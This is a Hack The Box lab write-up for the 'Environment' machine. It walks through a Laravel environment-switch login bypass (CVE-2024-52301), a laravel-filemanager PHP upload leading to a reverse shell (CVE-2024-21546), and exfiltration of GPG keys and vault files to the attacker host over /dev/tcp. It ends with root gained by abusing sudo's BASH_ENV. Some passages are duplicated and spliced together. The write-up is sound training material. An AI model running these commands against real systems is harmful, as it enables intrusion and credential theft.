---
layout: writeup
category: HTB
description: Environment is a linux medium difficulty machine. First, I will use [CVE-2024-52301](https://nvd.nist.gov/vuln/detail/CVE-2024-52301) in a laravel web service to change laravel environment to preprod as the login page can be bypassed if configurated like that. After that, I will exploit an upload form vulnerable to [CVE-2024-21546](https://nvd.nist.gov/vuln/detail/CVE-2024-21546) to bypass bad filtering of uploaded file extension, and in consequence I can upload a php file. Then, I will find a gpg encrypted file in hish home that can be decrypted with readable gpg keys. Finally, I will abuse a sudoers configuration that allows preserving the `BASH_ENV` environment variable that can be used to execute a bash script after executing the sudo allowed binary.
points: 30
solves: 3859
tags: laravel cve-2024-52301 laravel-environment laravel-filemanager upload-vulnerabilities php-reverse-shell gpg-decrypt sudoers bash_env
date: 2025-09-19
title: HTB Environment writeup
comments: false
---

{% raw %}

"Environment" is a linux medium difficulty machine. First, I will use [CVE-2024-52301](https://nvd.nist.gov/vuln/detail/CVE-2024-52301) in a laravel web service to change laravel environment to preprod as the login page can be bypassed if configurated like that. After that, I will exploit an upload form vulnerable to [CVE-2024-21546](https://nvd.nist.gov/vuln/detail/CVE-2024-21546) to bypass bad filtering of uploaded file extension, and in consequence I can upload a php file. Then, I will find a gpg encrypted file in hish home that can be decrypted with readable gpg keys. Finally, I will abuse a sudoers configuration that allows preserving the `BASH_ENV` environment variable that can be used to execute a bash script after executing the sudo allowed binary.

# Ports enumeration with nmap

```bash
❯ sudo nmap -sS -sVC -p- --open --min-rate 5000 -v -n -Pn 10.10.11.67 -oA environment
<..SNIP..>
❯ cat environment.nmap
# Nmap 7.94SVN scan initiated Sun Sep 14 14:37:46 2025 as: nmap -sS -sVC -p- --open --min-rate 5000 -v -n -Pn -oA environment 10.10.11.67
Nmap scan report for 10.10.11.67
Host is up (0.10s latency).
Not shown: 62559 closed tcp ports (reset), 2973 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)
|_  256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)
80/tcp   open  http    nginx 1.22.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.22.1
|_http-title: Did not follow redirect to http://environment.htb

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep 14 14:38:11 2025 -- 1 IP address (1 host up) scanned in 25.01 seconds
```

> [My used arguments for nmap](http://gabrielgonzalez211.github.io/blog/nmap-arguments.html)

22 -> OpenSSH
80 -> nginx 1.22.1, redirect to `environment.htb`

Add to `/etc/hosts`:

```bash
❯ sudo vi /etc/hosts
10.10.11.67 environment.htb
```

# Web enumeration

Main page:

![[Pasted image 20250914144445.png]]

Mailing list:

![[Pasted image 20250914144618.png]]

It's a post request to `/mailing`:

![[Pasted image 20250914144710.png]]

Successfull message:

![[Pasted image 20250914144853.png]]

When I don't put a correct email it displays error message:

![[Pasted image 20250914145657.png]]

It's a laravel page because there's a `laravel_session` cookie:

![[Pasted image 20250914145955.png]]

Routes fuzzing reveals some new routes:

```bash
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://environment.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        1l       27w     1713c http://environment.htb/build/assets/styles-Bl2K3jyg.css
200      GET        1l      119w     4111c http://environment.htb/build/assets/login-CnECh1Us.css                200      GET       54l      174w     2391c http://environment.htb/login 
302      GET       12l       22w      358c http://environment.htb/logout => http://environment.htb/login
405      GET     2575l     8675w   244841c http://environment.htb/mailing
200      GET       87l      392w     4602c http://environment.htb/
405      GET     2575l     8675w   244839c http://environment.htb/upload
200      GET       50l      135w     2125c http://environment.htb/up
301      GET        7l       11w      169c http://environment.htb/storage => http://environment.htb/storage/
301      GET        7l       11w      169c http://environment.htb/storage/files => http://environment.htb/storage/files/
301      GET        7l       11w      169c http://environment.htb/build => http://environment.htb/build/
301      GET        7l       11w      169c http://environment.htb/build/assets => http://environment.htb/build/assets/
301      GET        7l       11w      169c http://environment.htb/vendor => http://environment.htb/vendor/
[####################] - 27m   135674/135674  0s      found:13      errors:2      
[####################] - 27m    30000/30000   19/s    http://environment.htb/ 
[####################] - 27m    30000/30000   18/s    http://environment.htb/storage/
[####################] - 27m    30000/30000   18/s    http://environment.htb/storage/files/
[####################] - 27m    30000/30000   19/s    http://environment.htb/vendor/      
```

`/login` displays a Marketing Management Portal:

![[Pasted image 20250914164214.png]]

If I enter any random email and password, it gives an error:

![[Pasted image 20250914164301.png]]

![[Pasted image 20250914164315.png]]

`/upload` doesn't receive GET method:

```bash
❯ curl -i -s -X GET -d '' http://environment.htb/upload | head
HTTP/1.1 405 Method Not Allowed
Server: nginx/1.22.1
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
allow: POST
Cache-Control: no-cache, private
date: Sun, 14 Sep 2025 14:43:50 GMT

<!DOCTYPE html>
```

![[Pasted image 20250914174210.png]]

But if I make a POST request, it neither works because it seems to need a valid csrf token, that I sense that is obtained when it gets logged in:

```bash
❯ curl -i -s -X POST -d '' http://environment.htb/upload | head
HTTP/1.1 419 unknown status
Server: nginx/1.22.1
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Cache-Control: no-cache, private
date: Sun, 14 Sep 2025 14:46:49 GMT
Set-Cookie: laravel_session=eyJpdiI6Im9YL21JaEZsQ3l4OUpxaDRENFVEdEE9PSIsInZhbHVlIjoiNHlyU2FZQjRwMGgwV0dkckdSOEcyN21QMDFYR2RWYmpXbGpCSDA0Y0t3a0VMd3cwZ09WMCtmbXM3NnpuVGVuSFNudVdtem12TUFoczl5WmxDdWZnNU1LUFVISkgrOHpzUlB2dG9uanh6cDJpWExHeHdvLzFJUVVFV2RvdGN0OTAiLCJtYWMiOiJhYTdjYThiNWFhNmZiNmRhZWNmOWUyNTQ0ODZmNmY4YTkwOGMyNTA3YWQ5OThjYzViNzMxMTkzZjI3MmI4ZDc5IiwidGFnIjoiIn0%3D; expires=Sun, 14 Sep 2025 16:46:49 GMT; Max-Age=7200; path=/; httponly; samesite=lax

<!DOCTYPE html>
```

The rest of directories are 403 forbidden.

PHP and laravel versions were leaked in the "Method not allowed" page. Laravel version is 11.30.0.

Latest version of laravel as can be saw in github it's 12.28.1, so our current version it's outdated:

![[Pasted image 20250914174527.png]]

That version it's vulnerable to [CVE-2024-52301](https://nvd.nist.gov/vuln/detail/CVE-2024-52301), which allows to change environment used in laravel application by calling any URL with a special crafted query string.

[This page](https://github.com/Nyamort/CVE-2024-52301) explains it so well. I can change the laravel environment by adding the "?--env=\<environment\>".

In the main page, if I try this, I can see the mode displayed in the footer changes:

![[Pasted image 20250914183822.png]]

![[Pasted image 20250914183902.png]]

![[Pasted image 20250914184051.png]]

For now, I can't do more here.

# Code analysis

As saw before, an error in the application makes showing a debug page that contains code.

So to see the login page code as it's one of the most importants here, I will make an error modifying the parameter names:

![[Pasted image 20250914185606.png]]

And I get the error page:

![[Pasted image 20250914185629.png]]

It shows lfm upload module in the top: `name('unisharp.lfm.upload')->middleware([AuthMiddleware::class]);`. But now, I can't do nothing with it because I can't upload nothing.

If the $keep_loggedin variable it's different to `False`, it executes another block, so I will quit the parameter password to scroll down and see more code:

![[Pasted image 20250914191858.png]]

There's nothing more than a comment in that block:

![[Pasted image 20250914192039.png]]

Now, I will change the remember parameter to another thing than False or True to scroll down more:

![[Pasted image 20250914192348.png]]

![[Pasted image 20250914192500.png]]

It shows that if the environment it's set to preprod, it logins as administrator and redirects to `/management/dashboard`:

```php
if(App::environment() == "preprod") { //QOL: login directly as me in dev/local/preprod envs
	$request->session()->regenerate();
	$request->session()->put('user_id', 1);
	return redirect('/management/dashboard');
}
```

And it's possible to change it using the CVE-2024-52301 vulnerability!

![[Pasted image 20250914193052.png]]

And I get logged in!:

![[Pasted image 20250914193129.png]]

# Upload exploit (shell as www-data)

In the profile section, I can upload a profile picture:

![[Pasted image 20250914193429.png]]

I will select a random image and make an error to see the code:

![[Pasted image 20250914195515.png]]

![[Pasted image 20250914195605.png]]

Doesn't work, here the error is well handled:

![[Pasted image 20250914195635.png]]

However, I saw before that it's using unisharp lfm upload. Which is [laravel file manager](https://unisharp.github.io/laravel-filemanager/).

If I search for vulnerabilities, I can find [CVE-2024-21546](https://nvd.nist.gov/vuln/detail/CVE-2024-21546) which allows RCE.

> Versions of the package unisharp/laravel-filemanager before 2.9.1 are vulnerable to Remote Code Execution (RCE) through using a valid mimetype and inserting the . character after the php file extension. This allows the attacker to execute malicious code.

So I will try to upload a php file that shows phpinfo using a ".", the same content-type that when I upload an image and the same magic bytes:

![[Pasted image 20250914201550.png]]

And it works!:

![[Pasted image 20250914201602.png]]

It shows some colors because I left some image bytes in the file. However, going to the page source, I can access the uploaded file path and see phpinfo:

![[Pasted image 20250914201700.png]]

![[Pasted image 20250914201723.png]]

Now I will upload one that gives me a reverse shell using [this](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php):

```bash
❯ nc -lvnp 443
listening on [any] 443 ...
```

![[Pasted image 20250914204728.png]]

Only uploading it, I receive the reverse shell, probably because it's loaded in the profile page because of the img tag:

![[Pasted image 20250914204850.png]]

Now, I will do the [TTY treatment](/blog/tty-treatment.html) to have a better shell:

![[Pasted image 20250919173205.png]]
![[Pasted image 20250919173233.png]]

Flag is visible:

```bash
www-data@environment:/$ cat /home/hish/user.txt 
dd****************************b5
```


# Privilege escalation to hish user

As the web application is made with laravel, the database configuration it's stored in .env:

```bash
www-data@environment:~/app$ ls -l .env
-rw-r--r-- 1 www-data www-data 1177 Jan 12  2025 .env
www-data@environment:~/app$ cat .env
APP_NAME=Laravel
APP_ENV=production
APP_KEY=base64:BRhzmLIuAh9UG8xXCPuv0nU799gvdh49VjFDvETwY6k=
APP_DEBUG=true
APP_TIMEZONE=UTC
APP_URL=http://environment.htb
APP_VERSION=1.1

APP_LOCALE=en
APP_FALLBACK_LOCALE=en
APP_FAKER_LOCALE=en_US

APP_MAINTENANCE_DRIVER=file
# APP_MAINTENANCE_STORE=database

PHP_CLI_SERVER_WORKERS=4

BCRYPT_ROUNDS=12

LOG_CHANNEL=stack
LOG_STACK=single
LOG_DEPRECATIONS_CHANNEL=null
LOG_LEVEL=debug

DB_CONNECTION=sqlite
# DB_HOST=127.0.0.1
# DB_PORT=3306
# DB_DATABASE=laravel
# DB_USERNAME=root
# DB_PASSWORD=

SESSION_DRIVER=database
SESSION_LIFETIME=120
SESSION_ENCRYPT=false
SESSION_PATH=/
SESSION_DOMAIN=null

BROADCAST_CONNECTION=log
FILESYSTEM_DISK=local
QUEUE_CONNECTION=database

CACHE_STORE=database
CACHE_PREFIX=

MEMCACHED_HOST=127.0.0.1

REDIS_CLIENT=phpredis
REDIS_HOST=127.0.0.1
REDIS_PASSWORD=null
REDIS_PORT=6379

MAIL_MAILER=log
MAIL_SCHEME=null
MAIL_HOST=127.0.0.1
MAIL_PORT=2525
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_FROM_ADDRESS="hello@example.com"
MAIL_FROM_NAME="${APP_NAME}"

AWS_ACCESS_KEY_ID=
AWS_SECRET_ACCESS_KEY=
AWS_DEFAULT_REGION=us-east-1
AWS_BUCKET=
AWS_USE_PATH_STYLE_ENDPOINT=false

VITE_APP_NAME="${APP_NAME}"
```

It uses sqlite for the database. Which it's stored in database directory:

```bash
www-data@environment:~/app$ cd database/
www-data@environment:~/app/database$ ls -l
total 120
-rw-r--r-- 1 www-data www-data 110592 Sep 20 02:10 database.sqlite
drwxr-xr-x 2 www-data www-data   4096 Apr  7 19:58 factories
drwxr-xr-x 2 www-data www-data   4096 Apr  7 19:58 migrations
drwxr-xr-x 2 www-data www-data   4096 Apr  7 19:58 seeders
```

## Inspect database:

```bash
www-data@environment:~/app/database$ sqlite3 database.sqlite 
SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> 
```

Show tables:

```bash
sqlite> .tables
cache                  jobs                   sessions             
cache_locks            mailing_list           users                
failed_jobs            migrations           
job_batches            password_reset_tokens
```

Show columns of table users:

```bash
sqlite> pragma table_info(users);
0|id|INTEGER|1||1
1|name|varchar|1||0
2|email|varchar|1||0
3|email_verified_at|datetime|0||0
4|password|varchar|1||0
5|remember_token|varchar|0||0
6|created_at|datetime|0||0
7|updated_at|datetime|0||0
8|profile_picture|varchar|0||0
```

Select email, name and password from table users:

```bash
sqlite> SELECT name,email,password FROM users;
Hish|hish@environment.htb|$2y$12$QPbeVM.u7VbN9KCeAJ.JA.WfWQVWQg0LopB9ILcC7akZ.q641r1gi
Jono|jono@environment.htb|$2y$12$i.h1rug6NfC73tTb8XF0Y.W0GDBjrY5FBfsyX2wOAXfDWOUk9dphm
Bethany|bethany@environment.htb|$2y$12$6kbg21YDMaGrt.iCUkP/s.yLEGAE2S78gWt.6MAODUD3JXFMS13J.
```

These hashes seems to be encrypted with bcrypt:

```bash
❯ hashid '$2y$12$QPbeVM.u7VbN9KCeAJ.JA.WfWQVWQg0LopB9ILcC7akZ.q641r1gi'
Analyzing '$2y$12$QPbeVM.u7VbN9KCeAJ.JA.WfWQVWQg0LopB9ILcC7akZ.q641r1gi'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt
```

I will write these hashes into a file and try to crack them with john:

```bash
❯ vi users.hashes 
hish@environment.htb:$2y$12$QPbeVM.u7VbN9KCeAJ.JA.WfWQVWQg0LopB9ILcC7akZ.q641r1gi
jono@environment.htb:$2y$12$i.h1rug6NfC73tTb8XF0Y.W0GDBjrY5FBfsyX2wOAXfDWOUk9dphm
bethany@environment.htb:$2y$12$6kbg21YDMaGrt.iCUkP/s.yLEGAE2S78gWt.6MAODUD3JXFMS13J.
```

The hashes are not crackable as I tried it.

## GPG file 

Backup folder in hish home accessible by www-data user:

```bash
www-data@environment:/home/hish$ ls -la
total 36
drwxr-xr-x 5 hish hish 4096 Apr 11 00:51 .
drwxr-xr-x 3 root root 4096 Jan 12  2025 ..
lrwxrwxrwx 1 root root    9 Apr  7 19:29 .bash_history -> /dev/null
-rw-r--r-- 1 hish hish  220 Jan  6  2025 .bash_logout
-rw-r--r-- 1 hish hish 3526 Jan 12  2025 .bashrc
drwxr-xr-x 4 hish hish 4096 Sep 20 01:40 .gnupg
drwxr-xr-x 3 hish hish 4096 Jan  6  2025 .local
-rw-r--r-- 1 hish hish  807 Jan  6  2025 .profile
drwxr-xr-x 2 hish hish 4096 Jan 12  2025 backup
-rw-r--r-- 1 root hish   33 Sep 19 20:02 user.txt
```

It contains a gpg encryption file:

```bash
www-data@environment:/home/hish/backup$ ls -la
total 12
drwxr-xr-x 2 hish hish 4096 Jan 12  2025 .
drwxr-xr-x 5 hish hish 4096 Apr 11 00:51 ..
-rw-r--r-- 1 hish hish  430 Sep 20 01:41 keyvault.gpg
```


But I can't decrypt it as I'm not hish and I don't have permissions to create a .gnupg directory as www-data:

```bash
www-data@environment:/home/hish/.gnupg$ gpg --decrypt keyvault.gpg
gpg: Fatal: can't create directory '/var/www/.gnupg': Permission deniedBackup folder in hish home:

```bash
www-data@environment:/home/hish$ ls -la
total 36
drwxr-xr-x 5 hish hish 4096 Apr 11 00:51 .
drwxr-xr-x 3 root root 4096 Jan 12  2025 ..
lrwxrwxrwx 1 root root    9 Apr  7 19:29 .bash_history -> /dev/null
-rw-r--r-- 1 hish hish  220 Jan  6  2025 .bash_logout
-rw-r--r-- 1 hish hish 3526 Jan 12  2025 .bashrc
drwxr-xr-x 4 hish hish 4096 Sep 20 01:40 .gnupg
drwxr-xr-x 3 hish hish 4096 Jan  6  2025 .local
-rw-r--r-- 1 hish hish  807 Jan  6  2025 .profile
drwxr-xr-x 2 hish hish 4096 Jan 12  2025 backup
-rw-r--r-- 1 root hish   33 Sep 19 20:02 user.txt
```

It contains a gpg encryption file:

```bash
www-data@environment:/home/hish/backup$ ls -la
total 12
drwxr-xr-x 2 hish hish 4096 Jan 12  2025 .
drwxr-xr-x 5 hish hish 4096 Apr 11 00:51 ..
-rw-r--r-- 1 hish hish  430 Sep 20 01:41 keyvault.gpg
```


But I can't decrypt it as I'm not hish and I don't have permissions to create a .gnupg directory as www-data:

```bash
www-data@environment:/home/hish/.gnupg$ gpg --decrypt keyvault.gpg
gpg: Fatal: can't create directory '/var/www/.gnupg': Permission denied
```

However, I can transfer the files inside .gnupg folder to my machine and try to decrypt it:

### Keyvault transfer

- My machine:
```bash
❯ nc -lvnp 443 > keyvault.gpg
listening on [any] 443 ...
```
- "Environment" machine:
```bash
www-data@environment:/home/hish/backup$ cat keyvault.gpg > /dev/tcp/10.10.14.175/443
```

### GPG home files transfer

- My machine:
```bash
❯ mkdir gpg-files
❯ cd gpg-files
❯ nc -lvnp 443 > gpg-files.zip
listening on [any] 443 ...
```
- "Environment machine":
```bash
www-data@environment:/home/hish/.gnupg$ zip -r /tmp/gpg-files.zip .
  adding: private-keys-v1.d/ (stored 0%)
  adding: private-keys-v1.d/C2DF4CF8B7B94F1EEC662473E275A0E483A95D24.key (deflated 41%)
  adding: private-keys-v1.d/3B966A35D4A711F02F64B80E464133B0F0DBCB04.key (deflated 41%)
  adding: trustdb.gpg (deflated 93%)
  adding: pubring.kbx (deflated 6%)
  adding: openpgp-revocs.d/ (stored 0%)
  adding: openpgp-revocs.d/F45830DFB638E66CD8B752A012F42AE5117FFD8E.rev (deflated 37%)
  adding: pubring.kbx~ (deflated 25%)
  adding: random_seed (stored 0%)
www-data@environment:/home/hi### Decryptionsh/.gnupg$ cat /tmp/gpg-files.zip > /dev/tcp/10.10.14.175/443
www-data@environment:/home/hish/.gnupg$ rm /tmp/gpg-files.zip
```


```bash
❯ unzip gpg-files.zip
Archive:  gpg-files.zip
   creating: private-keys-v1.d/
  inflating: private-keys-v1.d/C2DF4CF8B7B94F1EEC662473E275A0E483A95D24.key  
  inflating: private-keys-v1.d/3B966A35D4A711F02F64B80E464133B0F0DBCB04.key  
  inflating: trustdb.gpg             
  inflating: pubring.kbx             
   creating: openpgp-revocs.d/
  inflating: openpgp-revocs.d/F45830DFB638E66CD8B752A012F42AE5117FFD8E.rev  
  inflating: pubring.kbx~            
 extracting: random_seed             
❯ rm gpg-files.zip
```

### Decryption

Decrypt using the gpg files from hish directory:

```bash
❯ gpg --homedir gpg-files --decrypt keyvault.gpg
gpg: WARNING: unsafe permissions on homedir '/home/gabri/Desktop/HackTheBox/machines/Environment-10.10.11.67/content/gpg-files'
gpg: encrypted with 2048-bit RSA key, ID B755B0EDD6CFCFD3, created 2025-01-11
      "hish_ <hish@environment.htb>"
PAYPAL.COM -> Ihaves0meMon$yhere123
ENVIRONMENT.HTB -> marineSPm@ster!!
FACEBOOK.COM -> summerSunnyB3ACH!!
```

It was successfull and it leaks three passwords. As it's supposed to be of hish user, I will try to use the "environment.htb" password as him/her:

```bash
www-data@environment:/home/hish$ su hish
Password: marineSPm@ster!!
bash-5.2$ whoami
hish
```

And it worked!

# Privilege escalation to root

Hish has sudo privileges to execute as any user the command `systeminfo`:

```bash
bash-5.2$ sudo -l
[sudo] password for hish: marineSPm@ster!!
Matching Defaults entries for hish on environment:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+="ENV BASH_ENV", use_pty

User hish may run the following commands on environment:
    (ALL) /usr/bin/systeminfo
```

As expected, when executed it gives some system information:

```bash
bash-5.2$ sudo /usr/bin/systeminfo 

### Displaying kernel ring buffer logs (dmesg) ###
[    5.626913] Console: switching to colour frame buffer device 160x50
[    5.628774] vmwgfx 0000:00:0f.0: [drm] fb0: vmwgfxdrmfb frame buffer device
[    5.775290] NET: Registered PF_VSOCK protocol family
[    5.956458] auditfilter: audit rule for LSM 'crond_t' is invalid
[    5.956523] auditfilter: audit rule for LSM 'crond_t' is invalid
[    6.038969] vmxnet3 0000:03:00.0 eth0: intr type 3, mode 0, 3 vectors allocated
[    6.044637] vmxnet3 0000:03:00.0 eth0: NIC Link is Up 10000 Mbps
[ 6160.787700] perf: interrupt took too long (2630 > 2500), lowering kernel.perf_event_max_sample_rate to 76000
[ 8498.749069] perf: interrupt took too long (3293 > 3287), lowering kernel.perf_event_max_sample_rate to 60500
[15628.655135] perf: interrupt took too long (4142 > 4116), lowering kernel.perf_event_max_sample_rate to 48250

### Checking system-wide open ports ###
State        Recv-Q       Send-Q             Local Address:Port             Peer Address:Port       Process                                                                             
LISTEN       0            5                        0.0.0.0:8000                  0.0.0.0:*           users:(("python3",pid=4257,fd=3))                                                  
LISTEN       0            511                      0.0.0.0:80                    0.0.0.0:*           users:(("nginx",pid=855,fd=5),("nginx",pid=854,fd=5),("nginx",pid=853,fd=5))       
LISTEN       0            128                      0.0.0.0:22                    0.0.0.0:*           users:(("sshd",pid=850,fd=3))                                                      
LISTEN       0            511                         [::]:80                       [::]:*           users:(("nginx",pid=855,fd=6),("nginx",pid=854,fd=6),("nginx",pid=853,fd=6))       
LISTEN       0            128                         [::]:22                       [::]:*           users:(("sshd",pid=850,fd=4))                                                      

### Displaying information about all mounted filesystems ###
sysfs        on  /sys                                                 type  sysfs        (rw,nosuid,nodev,noexec,relatime)
proc         on  /proc                                                type  proc         (rw,relatime,hidepid=invisible)
udev         on  /dev                                                 type  devtmpfs     (rw,nosuid,relatime,size=1980752k,nr_inodes=495188,mode=755,inode64)
devpts       on  /dev/pts                                             type  devpts       (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
tmpfs        on  /run                                                 type  tmpfs        (rw,nosuid,nodev,noexec,relatime,size=400920k,mode=755,inode64)
/dev/sda1    on  /                                                    type  ext4         (rw,relatime,errors=remount-ro)
securityfs   on  /sys/kernel/security                                 type  securityfs   (rw,nosuid,nodev,noexec,relatime)
tmpfs        on  /dev/shm                                             type  tmpfs        (rw,nosuid,nodev,inode64)
tmpfs        on  /run/lock                                            type  tmpfs        (rw,nosuid,nodev,noexec,relatime,size=5120k,inode64)
cgroup2      on  /sys/fs/cgroup                                       type  cgroup2      (rw,nosuid,nodev,noexec,relatime,nsdelegate,memory_recursiveprot)
pstore       on  /sys/fs/pstore                                       type  pstore       (rw,nosuid,nodev,noexec,relatime)
bpf          on  /sys/fs/bpf                                          type  bpf          (rw,nosuid,nodev,noexec,relatime,mode=700)
systemd-1    on  /proc/sys/fs/binfmt_misc                             type  autofs       (rw,relatime,fd=30,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=13863)
mqueue       on  /dev/mqueue                                          type  mqueue       (rw,nosuid,nodev,noexec,relatime)
hugetlbfs    on  /dev/hugepages                                       type  hugetlbfs    (rw,relatime,pagesize=2M)
tracefs      on  /sys/kernel/tracing                                  type  tracefs      (rw,nosuid,nodev,noexec,relatime)
debugfs      on  /sys/kernel/debug                                    type  debugfs      (rw,nosuid,nodev,noexec,relatime)
configfs     on  /sys/kernel/config                                   type  configfs     (rw,nosuid,nodev,noexec,relatime)
fusectl      on  /sys/fs/fuse/connections                             type  fusectl      (rw,nosuid,nodev,noexec,relatime)
ramfs        on  /run/credentials/systemd-sysusers.service            type  ramfs        (ro,nosuid,nodev,noexec,relatime,mode=700)
ramfs        on  /run/credentials/systemd-sysctl.service              type  ramfs        (ro,nosuid,nodev,noexec,relatime,mode=700)
ramfs        on  /run/credentials/systemd-tmpfiles-setup-dev.service  type  ramfs        (ro,nosuid,nodev,noexec,relatime,mode=700)
ramfs        on  /run/credentials/systemd-tmpfiles-setup.service      type  ramfs        (ro,nosuid,nodev,noexec,relatime,mode=700)
binfmt_misc  on  /proc/sys/fs/binfmt_misc                             type  binfmt_misc  (rw,nosuid,nodev,noexec,relatime)
tmpfs        on  /run/user/1000                                       type  tmpfs        (rw,nosuid,nodev,relatime,size=400916k,nr_inodes=100229,mode=700,uid=1000,gid=1000,inode64)

### Checking system resource limits ###
real-time non-blocking time  (microseconds, -R) unlimited
core file size              (blocks, -c) 0
data seg size               (kbytes, -d) unlimited
scheduling priority                 (-e) 0
file size                   (blocks, -f) unlimited
pending signals                     (-i) 15474
max locked memory           (kbytes, -l) 501144
max memory size             (kbytes, -m) unlimited
open files                          (-n) 1024
pipe size                (512 bytes, -p) 8
POSIX message queues         (bytes, -q) 819200
real-time priority                  (-r) 0
stack size                  (kbytes, -s) 8192
cpu time                   (seconds, -t) unlimited
max user processes                  (-u) 15474
virtual memory              (kbytes, -v) unlimited
file locks                          (-x) unlimited

### Displaying loaded kernel modules ###
Module                  Size  Used by
tcp_diag               16384  0
inet_diag              24576  1 tcp_diag
vsock_loopback         16384  0
vmw_vsock_virtio_transport_common    53248  1 vsock_loopback
binfmt_misc            28672  1
vmw_vsock_vmci_transport    36864  1
intel_rapl_msr         20480  0
vsock                  53248  5 vmw_vsock_virtio_transport_common,vsock_loopback,vmw_vsock_vmci_transport
intel_rapl_common      32768  1 intel_rapl_msr

### Checking disk usage for all filesystems ###
Filesystem      Size  Used Avail Use% Mounted on
udev            1.9G     0  1.9G   0% /dev
tmpfs           392M  688K  391M   1% /run
/dev/sda1       3.8G  1.7G  2.0G  46% /
tmpfs           2.0G     0  2.0G   0% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           392M     0  392M   0% /run/user/1000
```

The executable it's a bash script:

```bash
bash-5.2$ file /usr/bin/systeminfo 
/usr/bin/systeminfo: Bourne-Again shell script, ASCII text executable
```

And it executes some commands to show the system information:

```bash
bash-5.2$ cat /usr/bin/systeminfo 
#!/bin/bash
echo -e "\n### Displaying kernel ring buffer logs (dmesg) ###"
dmesg | tail -n 10

echo -e "\n### Checking system-wide open ports ###"
ss -antlp

echo -e "\n### Displaying information about all mounted filesystems ###"
mount | column -t

echo -e "\n### Checking system resource limits ###"
ulimit -a

echo -e "\n### Displaying loaded kernel modules ###"
lsmod | head -n 10

echo -e "\n### Checking disk usage for all filesystems ###"
df -h
```

Can't do nothing useful with that. Also, it's set on sudo privileges a env_keep flag:

![[Pasted image 20250919191936.png]]

The `env_keep` flag means that it preserves the user outside sudo context specified environment variables when executing inside sudo context (from `man sudoers`):

![[Pasted image 20250919192119.png]]

So hish sudo privileges allows preserving the ENV and BASH_ENV from hish context.

According to [shell tips](https://www.shell-tips.com/bash/environment-variables/#the-shell-init-file-variables-env-and-bash_env), the BASH_ENV variable is used by bash to define an init file to execute after the executed command:

![[Pasted image 20250919193245.png]]

So, I will create a `init-file` in `/tmp` to later store it in `BASH_ENV` environment variable and execute what I want inside sudo context. In my case I will copy bash to `/tmp` and give it SUID permissions:

```bash
bash-5.2$ nano /tmp/init-file
#!/bin/bash

cp /bin/bash /tmp/bash
chmod u+s /tmp/bash
bash-5.2$ chmod +x /tmp/init-file
```

```bash
bash-5.2$ BASH_ENV=/tmp/init-file sudo /usr/bin/systeminfo
[..snip..]
```

It successfully copied the bash with SUID privileges:

```bash
bash-5.2$ ls -l /tmp/bash 
-rwsr-xr-x 1 root root 1265648 Sep 20 03:49 /tmp/bash
```

To be root, it's only needed to execute `/tmp/bash -p`:

```bash
bash-5.2$ /tmp/bash -p
bash-5.2# whoami
root
```

And finally, it's possible to view root flag:

```bash
bash-5.2# cd /root/
bash-5.2# cat root.txt 
fb****************************71
```

{% endraw %}
